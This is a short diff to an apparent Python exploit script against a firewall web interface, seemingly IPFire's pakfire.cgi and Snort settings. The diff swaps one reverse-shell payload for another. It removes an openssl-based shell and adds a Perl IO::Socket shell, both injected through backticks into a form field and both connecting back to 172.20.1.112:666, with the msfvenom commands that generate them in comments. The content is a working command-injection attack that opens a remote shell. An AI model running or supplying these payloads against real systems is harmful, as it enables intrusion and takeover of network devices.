@@ -15,8 +15,7 @@ r = requests.get(f'https://{ip}:{port}/cgi-bin/pakfire.cgi', auth=(user, passwor
 print("Check: " + str(r.status_code))
 
 #msfvenom -p cmd/unix/reverse_perl LHOST=172.20.1.112 LPORT=666 -e cmd/perl -f raw -o shev.sh
-#msfvenom -p cmd/unix/reverse_openssl LHOST=172.20.1.112 LPORT=666 -e cmd/perl -f raw -o shev.sh
-payload = "`sh -c '(sleep 3643|openssl s_client -quiet -connect 172.20.1.112:666|while : ; do sh && break; done 2>&1|openssl s_client -quiet -connect 172.20.1.112:666 >/dev/null 2>&1 &)'`"
+payload = "`perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"172.20.1.112:666\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'`"
 
 data = {
             "ENABLE_SNORT_GREEN": "on",
